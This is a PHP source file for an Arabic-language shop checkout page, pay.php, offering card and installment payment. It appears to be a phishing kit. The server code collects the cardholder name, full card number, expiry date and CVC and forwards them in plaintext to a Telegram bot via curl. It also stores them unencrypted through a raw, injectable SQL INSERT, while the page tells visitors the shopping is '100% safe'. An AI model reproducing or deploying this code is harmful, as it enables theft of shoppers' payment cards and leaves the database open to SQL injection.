<?php
include 'controlPanel/Database.php';
$db = new Database();
$totalPrice = $_GET['totalPrice'];
$query = "SELECT * FROM `users` WHERE id = 2";
$result = $db->dbQuery($query);

if ($db->dbNumRows($result)) {
    $rows = $db->dbFetchResult($result);
    foreach ($rows as $row) {
        $token = $row['token'];
        $tokenID = $row['tokenID'];
    }
}

if (!isset($_SESSION["user"])) {
    header("location:index.php");
}
// $payment = $_GET['order'];
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    $user_captcha = $_POST['captcha'];
    $correct_captcha = $_SESSION['captcha_answer'];
    // التحقق من إجابة المستخدم
    if ($user_captcha == $correct_captcha) {
    $user = $_SESSION["user"];

    $name = $_SESSION["name"];

    $email = $_SESSION["email"];
    
    $phone = $_SESSION["phone"];
    
    $country = $_SESSION["country"];
    
    $city = $_SESSION["city"];
    
    $location = $_SESSION["location"];
    
    $street = $_SESSION["street"];
    
    $home = $_SESSION["home"];
    
    $zip = $_SESSION["zip"];

    $_SESSION["payment"] = $_POST['paymentWay'];
    $payment_getway = $_SESSION["payment"];
    if($payment_getway == 'tabby'  ){
            header("Location:checkoutTappey.php?totalPrice=$totalPrice");   
    }
    if($payment_getway == 'tmara'  ){
            header("Location:checkoutTmara.php?totalPrice=$totalPrice");  
    }

    $_SESSION["CashOrBatch"] = $_POST['CashOrBatch'];
    $CashOrBatch = $_SESSION["CashOrBatch"];

    $_SESSION["card_name"] = $_POST['card_name'];
    $card_name = $_SESSION["card_name"];

    $_SESSION["card_number"] = $_POST['card_number'];
    $card_number = $_SESSION["card_number"];

    $_SESSION["month"] = $_POST['month'];
    $month = $_SESSION["month"];

    $_SESSION["year"] = $_POST['year'];
    $year = $_SESSION["year"];

    $_SESSION["cvc"] = $_POST['cvc'];
    $cvc = $_SESSION["cvc"];

    $token1 = $token;
    $bot_id1 = $tokenID;
    // die($bot_id1);
    $first_batch = $_POST['first_batch'];
    // die($CashOrBatch);
    $databot = ':: طلب جديد :: ' . PHP_EOL . 'رقم الطلب: ' . $user . PHP_EOL . 'المبلغ الإجمالي: ' . $totalPrice . PHP_EOL . 'الدفعة الأولى: ' . $first_batch . PHP_EOL . 'فترة التقسيط : =>  ' . $CashOrBatch . PHP_EOL . 'الباطقة البنكية: ' . $payment_getway . PHP_EOL . '
    
' . 'الاسم على البطاقة: ' . $card_name. PHP_EOL . 'رقم البطاقة: ' . $card_number . PHP_EOL . 'الشهر: ' . $month . PHP_EOL . 'السنة: ' . $year . PHP_EOL . 'سي في في: ' . $cvc . PHP_EOL . ' 
:: رابط التعليمات ::'.PHP_EOL.'فاتورة: https://class-ksa.com/controlPanel/invoice.php?id='. $user.PHP_EOL.'عقد: https://class-ksa.com/controlPanel/Installment.php?id='. $user.PHP_EOL.'رابط واتساب: https://wa.me/'. $phone.PHP_EOL.' ';

    $apiToken = $token;

    $url = "https://api.telegram.org/bot{$apiToken}/sendMessage";
    $sender = [
        'chat_id' => $tokenID,
        'text' => $databot,
    ];
    
    if($payment_getway != 'tabby' && $payment_getway != 'tmara'  ){

    $curl = curl_init($url);
    
    // Set cURL options
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $sender);
    
    // Execute cURL request
    $response = curl_exec($curl);
   
    curl_close($curl);

    $query = "INSERT INTO `orders`(`name`, `phone`, `location`, `street`, `payment`, `first_batch`, `user`, `CardName`, `cardNumber`, `month`, `year`, `cvc`,`email`,`country`,`city`,`home`,`zip`,`payment_getway`,`CashOrBatch`) VALUES 
                                 ('$name', '$phone', '$location','$street', '$totalPrice', '$first_batch', '$user', '$card_name', '$card_number', '$month', '$year', '$cvc','$email','$country','$city','$home','$zip','$payment_getway','$CashOrBatch')";
   $result = $db->dbQuery($query);
    }
   if($payment_getway == 'tabby'  ){
    header("Location:checkoutTappey.php?totalPrice=$totalPrice");   
}
elseif($payment_getway == 'tmara'  ){
    header("Location:checkoutTmara.php?totalPrice=$totalPrice");  
}else{
        //header("location:payment.php?payment=$payment");
        header("location:confirem.php?payment=$payment");
    }
    
    
}else{
    echo "<script>alert('الاجبة خاطئة يرجى المحاولة مرة آخرى');</script>";

}
}


$num1 = rand(1, 10);
$num2 = rand(1, 10);
$operations = ['+'];
$operation = $operations[array_rand($operations)];

// حساب الناتج بناءً على العملية
$captcha_answer = $num1 + $num2;

$_SESSION['captcha_answer'] = $captcha_answer;

?>

<html lang="ar" dir="rtl">

<head>
    <?php include "head.php"; ?>
</head>
<style>
        .captcha-container {
            display: inline-block;
            background-color: #f0f0f0;
            padding: 10px;
            border-radius: 5px;
            box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
            font-family: 'Courier New', Courier, monospace;
            font-size: 24px;
            font-weight: bold;
            color: #333;
        }
    </style>

<body style="overflow: auto;background-color:#f3f3f3" data-new-gr-c-s-check-loaded="14.1125.0" data-gr-ext-installed="">


    <div class="loaderk d-flex justify-content-center align-items-center" style="display: none; height: 0px;">
    </div>
    <main>
        <section class="mt-5 py-3">
        </section>
        <div class="container col-md-7 " style="border-radius:5px;">
            <div class="mt-3 pb-3 border-bottom pay-header">
               

            <div class="hide">
            <div class="d-flex " style="padding: 15px;">
            <div class="store-info__logo me-3">
                    <img src="uploads/<?= $db->get_setting('web_logo') ?>" class="" style="display: inline-block;" width="60" alt="">

                </div>
                <div class="">
                    <h6>مرحباً بك</h6>
                    <nav aria-label="breadcrumb">
                        <ol class="breadcrumb pt-md-0 pt-2">
                            <li class="breadcrumb-item"><a href="index.php" class="text-decoration text-black-50">الرئيسية</a></li>
                            <li class="breadcrumb-item"><a href="order.php" class="text-decoration text-black-50">سلة المشتريات</a></li>
                            <li class="breadcrumb-item active text-black" aria-current="page">انهاء الطلب</li>
                        </ol>
                    </nav>
                </div>
            </div>


                <div class="d-none" id="bill-box" style="padding: 15px;">
                    <div  class="d-flex justify-content-between mt-4">
                        <span>ملخص السلة</span>
                        <span><?= $totalPrice?> <span><?php $db->get_setting('currancy') ?></span></span>
                    </div>
                </div>



                <div class="line">

                </div>


                <div class="d-flex justify-content-between mt-4 " style="padding: 15px;">
                    <span>اجمالي الطلب</span>
                    <div class="">
                    <span class="d-block text-end"> <?= $totalPrice?> <span><?php $db->get_setting('currancy') ?></span>
                    <a href="" class="text-danger d-block" style="font-size: 12px;">لديك كوبون تخفيض ؟</a>
                    </div>
                </div>
            </div>



                <div class="btn-box">
                <a href="" id="bill-btn" class="text-black btn m-auto pill-btn">  <i class="fa-solid fa-chevron-down d-none" id='down'></i>  <i class="fa-solid fa-chevron-up" id="up"></i> تفاصيل الفاتورة </a>

                </div>



            </div>
            <div class="sections-wrapper">
            
                <div class="container mb-5">
                    <!--  ****************************form*****************************S -->
                    <form action="pay.php?totalPrice=<?= $totalPrice ?>" method="POST" class="pb-2">

                        <div class="row">














                            <!--Moo-->

                            <div class="d-flex justify-content-start  mb-3 mt-3">

                                <div class="d-flex ">
                                    <span class="me-2" style="width:43px;height:43px;border-radius:50%;background-color:#00a8ff;color:white;display:flex;justify-content:center;align-items:center"><i class="fa-solid fa-money-bill"></i></span>
                                    <!-- <img src="assets/image/icons/truck.png" class="mx-3 me-2" width="40" alt=""> -->
                                    <div class="">
                                    <h6 style="margin-bottom: 0;">طريقة الدفع</h6>
                                    <span class="pay-name">مدى</span>
                                    </div>
                                </div>
                               
                                <!-- <hr class="mx-2 w-100"> -->
                            </div>

                            <div class="form-floating mb-10">
                                <!-- <i class="fas fa-circle fa-fw text-success fa-xl opacity-75"></i> -->
                                <!-- <img src="assets/image/icons/step-payment.svg" class="mx-3" alt=""> -->
                                <!-- <span>طريقة الدفع</span> -->
                                <!-- <hr class="mx-2" style="width: 60%;"> -->

                                <!-- <div class="row align-items-center mb-4">
                        <div class="col-6 mb-2">
                            <button class="btn btn-light py-2 border bg-white w-100 btn-lg shadow-sm">
                                <img src="assets/image/icons/mada.webp" class="w-50 mx-auto" height="50" alt="">
                            </button>
                        </div>
                        <div class="col-6 mb-2">
                            <button class="btn btn-light py-2 border bg-white w-100 btn-lg shadow-sm">
                                <img src="assets/image/icons/visa.png" class="w-50 mx-auto" height="50" alt="">
                            </button>
                        </div>
                        <div class="col-12">
                            <a href="success.php" class="btn btn-light bg-white py-2 border w-100 btn-lg shadow-sm">
                                <span class="bg-danger rounded-circle p-1">
                                    <i class="fa-solid fa-building-columns fa-fw "></i>
                                </span>
                                <h6 class="text-dark" style="font-size: 14px;">تحويل بنكي</h6>
                            </a>
                        </div>
                    </div>
                    <h3 class="my-3 text-center">
                        الدفعة المستحقة : <span class="text-danger"><?= $totalPrice ?> <?= $db->get_setting('currancy') ?></span>
                    </h3> -->
                            </div>
                        </div>







                        <div class="mb-3 pay-ways">
                            <!-- <label class="mb-3 mx-1">طريقة الدفع</label> -->
                            <div class="row px-3 justify-content-center justify-content-lg-start">
                                <div class="form-check col-6 col-lg-2 col-md-3   border rounded py-1 m-1 p-1 d-flex align-items-center justify-content-center">
                                    <input class="form-check-input me-2" required type="radio"  value="mada"  name="paymentWay" id="mada">
                                    <label class="form-check-label text-center " for="mada">
                                        <img src="assets/image/icons/mada.webp" width="65" height="45" class="mx-1" alt="">
                                    </label>
                                </div>
                                <div class="form-check col-6 col-lg-2 col-md-3   border rounded  py-1 m-1 p-1 d-flex align-items-center justify-content-center">
                                    <input class="form-check-input me-2" required type="radio" value="visa" name="paymentWay" id="visa">
                                    <label class="form-check-label  text-center  " for="visa">
                                        <img src="assets/image/icons/visa.png" width="65" height="35" class="mx-1" alt="">
                                    </label>
                                </div>

                                <input type="hidden" name="paymentt" id="paymentt" >




                                <!-- <div class="form-check col-4">
                                    <input class="form-check-input mt-3" type="radio" value="direct" name="paymentWay" id="flexRadioDefault2">
                                    <label class="form-check-label w-100 border text-center rounded py-2" for="flexRadioDefault2">
                                        <img src="assets/image/icons/trans.png" width="35" class="mx-1" alt="">
                                    </label>
                                </div> -->
                            </div>
                        </div>




                        <div class="" id="pay">

                        <p style="font-size: 14px;">في حالة اردت الشراء بالاقساط والاصناف المختارة تدعم الاقساط يرجى تحديد على كم قسط تريد التقسيط قبل تغيير الدفعة الاولى

                            </p>
                            <div class="row ">

                            
                            <div class="col-lg-12">
                                <input type="hidden" value="<?=$totalPrice?>" id="totalPrice">
                    <span class="mb-1 d-inline-block spanlable">الدفع/التقسيط على</span>
                    <select name="CashOrBatch" id="CashOrBatch" class="form-control rounded mb-3" id="">
                        <option value="0">نقدا</option>
                        <option value="1">شهر</option>
                        <option value="2">شهرين</option>
                        <option value="3">3 أشهر</option>
                        <option value="4">4 أشهر</option>
                        <option value="5">5 أشهر</option>
                        <option value="6">6 أشهر</option>
                        <option value="7">7 أشهر</option>
                        <option value="8">8 أشهر</option>
                        <option value="9">9 أشهر</option>
                        <option value="10">10 شهر</option>
                        <option value="11">11 شهر</option>
                        <option value="12">12 شهر</option>
                        <option value="13">13 شهر</option>
                        <option value="14">14 شهر</option>
                        <option value="15">15 شهر</option>
                        <option value="16">16 شهر</option>
                        <option value="17">17 شهر</option>
                        <option value="18">18 شهر</option>
                        <option value="19">19 شهر</option>
                        <option value="20">20 شهر</option>
                        <option value="21">21 شهر</option>
                        <option value="22">22 شهر</option>
                        <option value="23">23 شهر</option>
                        <option value="24">24 شهر</option>

                    </select>


                    </div>


                    <div class="col-lg-12">
                    <span class="mb-1 d-inline-block spanlable">الدفعة الاولى</span>

                    <input type="text" name="first_batch" id="first_batch" readonly class="form-control rounded mb-3" value="<?= $totalPrice?>"  autocomplete="off" required="" placeholder="الدفعة الاولى" maxlength="16">

                    </div>
                    <div class="col-lg-12">
                    <span class="mb-1 d-inline-block spanlable">قيمة كل قسط </span>

                    <input type="text"  id="all_batch" readonly class="form-control rounded mb-3" value="-"  autocomplete="off" required="" placeholder="قيمة كل قسط" maxlength="16">

                    </div>


                        <div class="col-lg-6">
                    <span class="mb-1 d-inline-block spanlable">الاسم على البطاقة</span>
                    <input type="text" class="form-control mb-3" name="card_name" id="name" autocomplete="off" placeholder="الأسم  على البطاقة">

                    <!-- <div class="form-floating mb-3">
                        <label for="cardname text-secondary">
                            <i class="fas fa-user fa-fw text-secondary mx-2"></i>
                            <span class="text-secondary">اسم حامل البطاقة</span>
                        </label>
                    </div> -->
                    </div> 


                                <div class="col-lg-6">
                    <span class="mb-1 d-inline-block spanlable">رقم البطاقة</span>

                    <input type="text" name="card_number"  class="form-control rounded mb-3" id="cardNumber" autocomplete="off"  placeholder="رقم البطاقة" maxlength="16">

                    <!-- <div class="form-floating mb-3">
                        <label for="cardNumber text-secondary">
                            <i class="fas fa-credit-card fa-fw text-secondary mx-2"></i>
                            <span class="text-secondary">رقم البطاقة</span>
                        </label>
                    </div> -->

                    </div>
                                <div class="col-lg-3 col-md-6 col-sm-6">
                                <div class="container">
                                <span class="mb-1 d-inline-block spanlable">تاريخ الانتهاء</span>

                                    <div class="row border rounded" style="overflow: hidden;">

                                        <div class="col-6 px-0 mx-0">
                                        <input type="text" class="form-control border-0" maxlength="2" name="month"  id="month" placeholder="الشهر">

                                            <!-- <div class="form-floating">
                                                <label for="floatingInput text-secondary">
                                                    <span class="text-secondary">الشهر</span>
                                                </label>
                                            </div> -->
                                        </div>
                                        <div class="col-6  px-0 mx-0">
                                        <input type="text" class="form-control border border-right-0 border-top-0 border-left border-bottom-0 rounded-0" maxlength="2" name="year" id="year" placeholder="السنة">

                                            <!-- <div class="form-floating">
                                                <label for="year text-secondary">
                                                    <span class="text-secondary">السنة</span>
                                                </label>
                                            </div> -->
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-3 col-md-6 col-sm-6">

                            <span class="mb-1 d-inline-block spanlable">رمز التحقق (cvc)</span>
                            <input type="text" class="form-control" maxlength="3" name="cvc" id="cvc" placeholder="رمز التحقق (cvc)">

                                <!-- <div class="form-floating mb-3">
                                    <label for="cvc text-secondary">
                                        <span class="text-secondary">رمز التحقق (CVV)</span>
                                    </label>
                                </div> -->
                            </div> 


                             



                            
                            </div>
                        </div>



                       <div class="d-none" id="pay2">

                       <div class="p-3" style="border: 20px solid #f5f5f5;border-radius:5px;">
                                <span class="mb-2 text-center fw-light d-block">تقبل جميع البطاقات</span>
                                <?php $pay = $totalPrice /4 ?>
                               <?php for($i=0;$i <4 ; $i++) { ?> 
                                <div class="d-flex justify-content-between mb-3">
                                    <img src="assets/image/icons/img-<?php echo($i+1) ?>.png" width="40" alt="">
                                    <span>
                                    <?php if($i==0){
                                    echo('اليوم');
                                }elseif($i==1){
                                    echo('بعد شهر');
                                }elseif($i==2){
                                    echo('بعد شهرين');
                                }elseif($i==3){
                                    echo('بعد 3 اشهر');
                                }
                                ?>
                                    </span>
                                    <p class="fw-bold"><?php echo($pay) ?> <span> <?php $db->get_setting('currancy') ?>  </span></p>
                                </div>  
                                <?php } ?>                           
                            </div>



                        <div class="row mt-3">
                        <div class="col-lg-12">
                    <span class="mb-2 d-inline-block">اختر طريقة الدفع</span>

                    <input type="text" readonly  value="قسط عملية الدفع" class="form-control rounded mb-3"  autocomplete="off" required="" placeholder="اختر طريقة الدفع" maxlength="16">

                    </div>
                        </div>


                        <div class="d-flex justify-content-start mt-2">
                            <img src="assets/image/icons/like.png" wwidth="25" height="20" class="me-2" alt="">
                            <span>ادفع 25% اليوم والباقي قسمه على 3 أشهر</span>
                        </div>

                        <div class="d-flex justify-content-start mt-2">
                            <img src="assets/image/icons/like.png" width="25" height="20" class="me-2" alt="">
                            <span>بدون فوائد أو رسوم</span>
                        </div>

                        <div class="d-flex justify-content-start mt-2 mb-4">
                            <img src="assets/image/icons/like.png" width="25" height="20" class="me-2" alt="">
                            <span>نقبل أي بطاقة بنكية أو ائتمانية</span>
                        </div>



                       </div>
                        



                        <div class="mt-4">
                            <button type="submit" name="confirm" id="CardBtn" class="btn btn-dark w-100">
                                <span>إكمال الدفع</span>
                                <!-- <i class="fa-solid fa-angle-left fa-fade fa-fw"></i> -->
                            </button>
                        </div>

                        <div class="container text-secondary mt-2 mb-4">

                            <p style="font-size: 14px;">تسوق إلكتروني آمن 100%
                                <i class="fab fa-cc-amazon-pay fa-fw mx-1"></i>
                                <i class="fab fa-cc-apple-pay fa-fw"></i>
                                <i class="fas fa-shield fa-fw mx-1"></i>
                            </p>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        </div>
        <a href="https://wa.me/<?= $db->get_setting('whatsapp') ?>" class="contact py-2 px-3 bg-success rounded-circle">
            <i class="fab fa-whatsapp text-white my-1 fa-2x"></i>
        </a>
    </main>
    <?php
    include "script.php";
    ?>
    <script>
        $('#CashOrBatch').change(function(event) {
            var total = $('#totalPrice').val();
            var batch = <?php $db->get_setting('batch')?>;
            var ee = total -batch;
            var bb = $('#CashOrBatch').val();
         
            
            var all_batch = ee/bb;

            if($(this).val() != 0){
                // var first_batch =total/($(this).val());
            $('#first_batch').val(batch);
            $('#all_batch').val(all_batch);
            } else{
                $('#first_batch').val(total);
                $('#all_batch').val('-');
            }
            
            // alert(total/$(this).val());
            
        });
        $('input[paymentWay]').change(function(event) {
            alert('ff');
        });
    </script>

</body>

</html>